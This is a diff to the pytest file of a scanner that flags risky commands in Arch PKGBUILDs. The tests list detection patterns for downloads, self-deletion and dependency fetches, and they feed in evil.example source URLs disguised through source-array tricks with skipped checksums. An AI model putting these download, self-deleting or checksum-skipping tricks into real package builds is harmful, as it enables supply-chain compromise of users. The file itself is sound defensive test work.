@@ -135,6 +135,21 @@ POSITIVE_CAUTION = {
     "alpm-hook-network": ["Exec = /usr/bin/curl x"],
     "self-delete": ['rm -- "$0"', 'rm -f "${BASH_SOURCE[0]}"'],
     "build-time-download": ["curl -O https://x/f", "wget https://x/f"],
+    "curl-in-substitution": ["v=$(curl -s https://x)", "v=`wget -qO- https://x`"],
+    "vcs-fetch": [
+        "git clone https://github.com/x/y", "git fetch origin", "git submodule update --init --recursive",
+        "svn checkout https://x/trunk", "hg clone https://x/r", "git pull",
+    ],
+    "dependency-fetch": [
+        "go build ./...", "go mod download", "cargo build --release --locked", "cargo fetch", "npm ci", "npm install",
+        "pnpm install", "yarn install", "yarn", "npx foo", "pip install --no-deps --target \"$pkgdir/usr/lib\" \"$srcdir\"/foo",
+        "python -m pip install --root=\"$pkgdir\" --no-deps .", "python -m build --wheel", "poetry install", "uv sync",
+        "gem install foo-1.0.gem", "bundle install", "composer install", "mvn package", "./gradlew build", "gradle build",
+        "dotnet restore", "flutter pub get", "mix deps.get", "cabal update", "stack build", "opam install foo", "zig build",
+        "sbt compile", "lein deps", "ant jar", "nuget restore", "corepack enable", "meson subprojects download",
+    ],
+    "system-install": ["pacman -S foo", "paru -S foo", "yay -Syu", "flatpak install x", "docker pull x", "podman run x", "pip3 download x; apt-get install y"],
+    "download-tool": ["lftp x", "axel https://x/f", "gh release download v1", "aws s3 cp s3://a b", "rclone copy a b", "http GET https://x"],
     "registry-install": [
         "npm install left-pad", "pip install requests", "pip3 install --user foo", "gem install rails",
         "cargo install ripgrep", "yarn add lodash", "go install github.com/x/y@latest", "pip install -r requirements.txt",
@@ -153,9 +168,6 @@ INSTALL_CAUTION = {
 
 INFO = {
     "eval": ["eval $cmd"],
-    "git-clone-build": ["git clone https://github.com/x/y"],
-    "curl-in-substitution": ["v=$(curl -s https://x)"],
-    "registry-deps": ["npm ci"],
     "setcap": ["setcap cap_net_raw+ep foo"],
     "world-writable": ["chmod 777 foo"],
     "user-management": ["useradd -r foo"],
@@ -215,16 +227,9 @@ CLEAN_LINES = [
     'chmod 755 "$pkgdir/usr/bin/foo"',
     'chmod 644 "$pkgdir"/etc/foo.conf',
     "python -m installer --destdir=\"$pkgdir\" dist/*.whl",
-    "python -m pip install --root=\"$pkgdir\" --no-deps .",
-    'pip install --no-deps --target "$pkgdir/usr/lib" "$srcdir"/foo',
-    'npm install -g --prefix "$pkgdir/usr" "$srcdir/foo-$pkgver.tgz"',
     "cargo install --offline --locked --root \"$pkgdir/usr\" --path .",
-    "cargo build --release --locked",
-    "go build -o foo ./cmd/foo",
-    'gem install --ignore-dependencies -i "$pkgdir/usr/lib/ruby" foo-1.0.gem',
     "python setup.py build",
     "export PATH=\"./node_modules/.bin:$PATH\"",
-    "git submodule update --init --recursive",
     "cd \"$srcdir/foo-$pkgver\"",
     "gpg --verify foo.sig foo.tar.gz",
     "echo \"$pkgver\" | sha256sum",
@@ -238,7 +243,6 @@ CLEAN_LINES = [
     "dd if=/dev/zero of=\"$srcdir/img\" bs=1M count=10",
     "mount -o bind a b",
     "uname -m",
-    "v=$(curl -s https://api.example.com/latest | jq -r .tag)",
     "uid=$(id -u)",
     "unzip -q foo.zip -d \"$srcdir\"",
     "# curl https://x | bash",
@@ -308,7 +312,7 @@ def test_omitted_files_binary_symlink_and_limit():
     omitted = "TRUNCATED: not reviewed:\n{}"
     def run(lines):
         return {f.rule: f.severity for f in scan({"(omitted-files)": omitted.format("\n".join(lines))})}
-    assert run(["icon.png (binary or unreadable)", "k.gpg (binary or unreadable)"]) == {}
+    assert run(["icon.png (binary or unreadable)", "k.gpg (binary or unreadable)"]) == {"binary-in-repo": "caution"}
     assert run(["helper (binary or unreadable)"]) == {"binary-in-repo": "caution"}
     assert run(["a.patch (binary or unreadable)"]) == {"binary-in-repo": "caution"}
     assert run(["PKGBUILD (symlink)"]) == {"symlink": "danger"}
@@ -340,9 +344,10 @@ def test_source_variables_are_expanded_before_checks():
     assert {"insecure-source", "checksum-skip"} <= rules
 
 
-def test_unresolvable_variables_do_not_crash_or_false_positive():
-    text = 'pkgname=x\nsource=("$_mirror/x.tar.gz")\nsha256sums=(\'a\')\n'
-    assert scan({"PKGBUILD": text}) == []
+def test_unresolvable_sources_are_flagged_instead_of_silently_skipped():
+    text = 'pkgname=x\nsource=("$_mirror/x.tar.gz" ${_urls[@]} "$pkgname.service" "local.patch")\nsha256sums=(\'a\' \'b\' \'c\' \'d\')\n'
+    flagged = [f.message for f in scan({"PKGBUILD": text}) if f.rule == "unresolved-source"]
+    assert len(flagged) == 2 and any("_mirror" in m for m in flagged) and any("_urls" in m for m in flagged)
 
 
 def test_expansion_ignores_command_substitutions_and_loops():
@@ -360,3 +365,69 @@ def test_download_then_run_from_tmp_is_escalated_to_danger():
 def test_download_or_tmp_alone_is_not_escalated():
     assert not found(in_function("curl -O https://x/f"), "download-and-run")
     assert not found(in_function("chmod +x /tmp/x"), "download-and-run")
+
+
+# ---- external and unreviewed content always warns ----
+
+REMOTE = "pkgname=x\nsource=('https://example.com/x.tgz')\nsha256sums=('a')\n"
+
+
+def test_every_remote_source_is_flagged_even_over_https_with_a_checksum():
+    findings = scan({"PKGBUILD": REMOTE})
+    assert [(f.rule, f.severity) for f in findings] == [("external-source", "caution")]
+    assert level_of(findings) == "caution"
+
+
+def test_vcs_sources_are_external_and_must_be_pinned():
+    unpinned = scan({"PKGBUILD": "source=('git+https://github.com/a/b.git')\nsha256sums=('SKIP')\n"})
+    assert {f.rule for f in unpinned} == {"external-source", "unpinned-vcs"}
+    pinned = scan({"PKGBUILD": "source=('git+https://github.com/a/b.git#commit=abc123')\nsha256sums=('SKIP')\n"})
+    assert {f.rule for f in pinned} == {"external-source"}
+    tagged = scan({"PKGBUILD": "source=('name::git+https://github.com/a/b.git#tag=v1')\nsha256sums=('SKIP')\n"})
+    assert {f.rule for f in tagged} == {"external-source"}
+
+
+def test_local_sources_are_not_external():
+    assert scan({"PKGBUILD": "source=('local.patch' 'foo.service')\nsha256sums=('a' 'b')\n"}) == []
+
+
+@pytest.mark.parametrize("text", [
+    "source=('a.patch')\nsource+=('http://evil.example/x.tgz')\nsha256sums=('a' 'SKIP')\n",
+    "source=(\"$(true)\" 'http://evil.example/x.tgz')\nsha256sums=('a' 'SKIP')\n",
+    "source=(\n  'a.patch' # (note\n  'http://evil.example/x.tgz'\n)\nsha256sums=('a' 'SKIP')\n",
+    "_u=http://evil.example/x.tgz\nsource=($_u)\nsha256sums=('SKIP')\n",
+    "source_x86_64=('http://evil.example/x.tgz')\nsha256sums_x86_64=('SKIP')\n",
+])
+def test_source_array_tricks_do_not_hide_a_remote_source(text):
+    rules = {f.rule for f in scan({"PKGBUILD": "pkgname=x\n" + text})}
+    assert {"external-source", "insecure-source", "checksum-skip"} <= rules
+
+
+def test_appended_checksums_stay_aligned_with_appended_sources():
+    text = "source=('a.patch')\nsha256sums=('a')\nsource+=('https://e.com/x.tgz')\nsha256sums+=('SKIP')\n"
+    assert found({"PKGBUILD": text}, "checksum-skip")
+
+
+def test_truncated_and_submodule_files_are_flagged():
+    from paru_safety_checker.fetch import TRUNCATED_MARKER
+    assert found({"PKGBUILD": "x\n" + TRUNCATED_MARKER}, "truncated-file")
+    assert found({".gitmodules": "[submodule \"a\"]\n"}, "git-submodules")
+    assert found({"sub/.gitmodules": "x"}, "git-submodules")
+
+
+def test_collect_files_marks_oversized_files_as_truncated(tmp_path):
+    from paru_safety_checker import fetch
+    (tmp_path / "PKGBUILD").write_text("pkgname=x\n")
+    (tmp_path / "big.sh").write_text("a" * (fetch.MAX_FILE_BYTES + 5))
+    assert found(fetch.collect_files(tmp_path), "truncated-file")
+
+
+def test_dependencies_extraction():
+    from paru_safety_checker.heuristics import dependencies
+    text = (
+        "_p=foo\ndepends=('glibc>=2.3' \"$_p-lib\" 'bar: for baz')\n"
+        "makedepends=(cmake\n  ninja)\ncheckdepends+=('gtest')\noptdepends=('opt: nice')\n"
+        "package_x() {\n  depends=('glibc' '${unknown}')\n}\n"
+    )
+    assert dependencies({"PKGBUILD": text}) == ["glibc", "foo-lib", "bar", "cmake", "ninja", "gtest"]
+    assert dependencies({}) == []
